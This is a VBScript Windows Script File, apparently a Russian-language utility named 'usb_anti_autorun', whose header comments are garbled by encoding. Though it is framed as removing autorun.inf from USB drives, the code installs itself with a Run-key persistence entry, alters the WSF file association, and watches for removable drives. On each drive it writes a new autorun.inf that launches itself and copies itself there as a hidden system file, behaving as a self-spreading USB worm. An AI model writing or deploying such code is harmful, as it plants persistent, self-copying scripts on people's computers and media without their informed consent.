<?xml version="1.0" encoding="windows-1251"?>
<!-- ������: usb_anti_autorun -->
<!-- �����: AxeL -->
<!-- ��� �������: ����� -->
<!-- ����: usb.wsf -->
<!-- ������: 1.2 -->
<!-- ����������: ������� ����� autorun.inf �� ���� (��� ��� ��������, ��� ����� � ������� ������� ������ �� 162 �� 182 ������������) -->
<!-- ���� �� ���������� ����, � ������ ������������� ����� -->
<!-- ����� ���������������: ��������������(autorun) -->
<!-- �����: ����� �������� ������ ��� ���� �����, �������� ��� ���������� (� �����, �����) -->
<!-- ��������: ������� (�� �����, �� ���������������) -->
<!-- ������� ��������� �������: Penetrator -->
<!-- ����� � �������: ����� ���� askett.hoter.ru ��� ����� -->
<!-- ��������� ��������: �� ������ ������ ����������� -->
<!-- ��������� �������: -->
<!-- 1:  -->
<!-- 2:  -->
<package>
<job id="Self_Install">
<runtime>
<description>
���: usb.wsf
�����: AxeL
��������: ������������� �   %ProgramFiles%\usb_anti_autorun
</description>
</runtime>
<script language="VBScript">
<![CDATA[
Option Explicit

Dim fso, sh
Dim oWmi, oSelQ, oItem
Dim Root, InstDir, InstFolder : InstFolder = "\usb_anti_autorun"
Dim File, attr
Dim RegKey

On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")

InstDir = sh.ExpandEnvironmentStrings("%programfiles%") & InstFolder
Root = sh.ExpandEnvironmentStrings("%SystemRoot%")

If (Chr(34) & fso.GetParentFolderName(WScript.ScriptFullName) & Chr(34)) <> (Chr(34) &  InstDir & Chr(34)) Then

	If Not fso.FolderExists(InstDir) Then fso.CreateFolder InstDir

	If fso.FileExists(InstDir & "\usb.wsf") Then
		Set File = fso.GetFile(InstDir & "\usb.wsf")
		attr = File.Attributes
		File.Attributes = 0
		fso.CopyFile WScript.ScriptFullName, InstDir & "\usb.wsf"
		File.Attributes = attr
	Else
		fso.CopyFile WScript.ScriptFullName, InstDir & "\usb.wsf"
		Set File = fso.GetFile(InstDir & "\usb.wsf")
		File.Attributes = 33
	End If

	sh.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\usb_autorun_remover", _
	Chr(34) & Root & "\System32\wscript.exe" & Chr(34) & " " & Chr(34) & InstDir & "\usb.wsf" & Chr(34) & " //Job:Work"

	RegKey = sh.RegRead("HKCR\WSFFile\EditFlags")
	If Err.Number = 0 Then sh.RegDelete "HKCR\WSFFile\EditFlags"
	RegKey = sh.RegRead("HKCR\WSFFile\Shell\Open\Command\")

	If RegKey <> "%SystemRoot%\System32\WScript.exe ""%1"" %*" Then _
	sh.RegWrite "HKCR\WSFFile\Shell\Open\Command\", "%SystemRoot%\System32\WScript.exe ""%1"" %*"

	sh.RegWrite "HKCR\WSFFile\EditFlags", 24, "REG_DWORD"

	Set oWmi = GetObject("WinMgmts:{impersonationLevel=impersonate}!//./root/cimv2")
	Set oSelQ = oWmi.ExecQuery("SELECT * FROM Win32_Process")

	For Each oItem In oSelQ
		If LCase(RTrim(oItem.CommandLine)) = LCase(Chr(34) & Root & "\System32\wscript.exe" & Chr(34) & " " & Chr(34) & InstDir & "\usb.wsf" & Chr(34) & " //Job:Work") _
		Then oItem.Terminate
	Next

	sh.Exec(Chr(34) & Root & "\System32\wscript.exe" & Chr(34) & " " & Chr(34) & InstDir & "\usb.wsf" & Chr(34) & " //Job:Work")
	
	If Len(fso.GetParentFolderName(WScript.ScriptFullName)) <=3 Then sh.Exec("explorer.exe " & fso.GetParentFolderName(WScript.ScriptFullName))
	
	Set fso = Nothing
	Set sh = Nothing
	Set oWmi = Nothing
	Set oSelQ = Nothing
	Set File = Nothing
	WScript.Quit
Else
	sh.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\usb_autorun_remover", _
	Chr(34) & Root & "\System32\wscript.exe" & Chr(34) & " " & Chr(34) & InstDir & "\usb.wsf" & Chr(34) & " //Job:Work"
	sh.Exec(Chr(34) & Root & "\System32\wscript.exe" & Chr(34) & " " & Chr(34) & InstDir & "\usb.wsf" & Chr(34) & " //Job:Work")
End If

Sub Error_Handler()
MsgBox Err.Number & Chr(13) & Err.Source & Chr(13) & Err.Description
Err.Clear
End Sub

]]>
</script>
</job>


<job id="Work">
<runtime>
<description>
���: usb.wsf
�����: AxeL
��������: ����� � ��������� � ������ 3 ������� ���������, �� ����������� �� ���-������ �����,
	  ���� ��, ��������� ������� ����� autorun.inf � ������� ���, ���� ���, �����...
</description>
</runtime>

<script language="VBScript">
<![CDATA[

Option Explicit
Dim CompName : CompName = "."
Dim fso, sh
Dim oWmi, oSelQ
Dim oDisk, oItem
Dim Root, InstDir, InstFolder : InstFolder = "\usb_anti_autorun"
Dim ts, File, attr
Dim Find
'On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")

InstDir = sh.ExpandEnvironmentStrings("%programfiles%") & InstFolder
Root = sh.ExpandEnvironmentStrings("%SystemRoot%")

Set oWmi = GetObject("WinMgmts:{impersonationLevel=impersonate}!//" & CompName & "/root/cimv2")

Set oSelQ = oWmi.ExecQuery("SELECT * FROM Win32_Process")
Find = 0

For Each oItem In oSelQ
	If LCase(RTrim(oItem.CommandLine)) = LCase(Chr(34) & Root & "\System32\wscript.exe" & Chr(34) & " " & Chr(34) & InstDir & "\usb.wsf" & Chr(34) & " //Job:Work") _
	Then Find = Find + 1
Next

If Find > 1 Then WScript.Quit 0

Set oDisk = oWmi.ExecNotificationQuery("SELECT * FROM __InstanceCreationEvent " & _
"WITHIN 3 WHERE TargetInstance ISA 'Win32_LogicalDisk'")

Do
Set oItem = oDisk.NextEvent

If (oItem.TargetInstance.MediaType = "12" Or IsNull(oItem.TargetInstance.MediaType) ) Then

	If fso.FileExists (oItem.TargetInstance.DeviceID & "\autorun.inf") Then
	Set File = fso.GetFile(oItem.TargetInstance.DeviceID & "\autorun.inf")
	File.Attributes = 0
	File.Delete
	End If

	Set ts = fso.CreateTextFile(oItem.TargetInstance.DeviceID & "\autorun.inf")
	WScript.Sleep(100)
	ts.WriteLine "[AutoRun]"
	ts.WriteLine "open=wscript usb.wsf"
	ts.WriteLine "shellexecute=wscript.exe usb.wsf"
	ts.WriteLine "action=Install USB_Autorun_Remover"
	ts.WriteLine "shell=open"
	ts.WriteLine "UseAutoPlay=1"
	ts.WriteLine "shell\open\Command=wscript.exe usb.wsf"
	ts.WriteLine "shell\explore\Command=wscript.exe usb.wsf"
	ts.close
	
	Set File = fso.GetFile(oItem.TargetInstance.DeviceID & "\autorun.inf")
	File.Attributes = 39
		If fso.FileExists(oItem.TargetInstance.DeviceID & "\usb.wsf") Then
		Set File = fso.GetFile(oItem.TargetInstance.DeviceID & "\usb.wsf")
		File.Attributes = 0
		End If
	fso.CopyFile WScript.ScriptFullName, oItem.TargetInstance.DeviceID & "\usb.wsf"
	Set File = fso.GetFile(oItem.TargetInstance.DeviceID & "\usb.wsf")
	File.Attributes = 39
	
End If

Loop While True

]]>
</script>
</job>
</package>
